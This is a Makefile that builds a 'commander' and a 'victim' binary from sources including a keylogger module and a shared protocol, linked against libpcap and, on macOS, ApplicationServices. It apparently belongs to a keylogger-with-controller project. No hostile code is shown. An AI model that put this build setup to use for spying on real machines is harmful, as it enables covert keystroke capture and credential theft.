CC = gcc
CFLAGS = -O2 -Wall -Wextra -Wpedantic -std=gnu99
LDFLAGS = -lpthread

UNAME_S = $(shell uname -s)
ifeq ($(UNAME_S),Darwin)
    LDFLAGS += -framework ApplicationServices
endif

SRC = src

all: commander victim

commander: $(SRC)/Commander.c $(SRC)/protocol.c $(SRC)/protocol.h $(SRC)/keylogger.h
	$(CC) $(CFLAGS) -o commander $(SRC)/Commander.c $(SRC)/protocol.c $(LDFLAGS) -lpcap

victim: $(SRC)/Victim.c $(SRC)/keylogger.c $(SRC)/protocol.c $(SRC)/protocol.h $(SRC)/keylogger.h
	$(CC) $(CFLAGS) -o victim $(SRC)/Victim.c $(SRC)/keylogger.c $(SRC)/protocol.c $(LDFLAGS) -lpcap

clean:
	rm -f commander victim

.PHONY: all clean
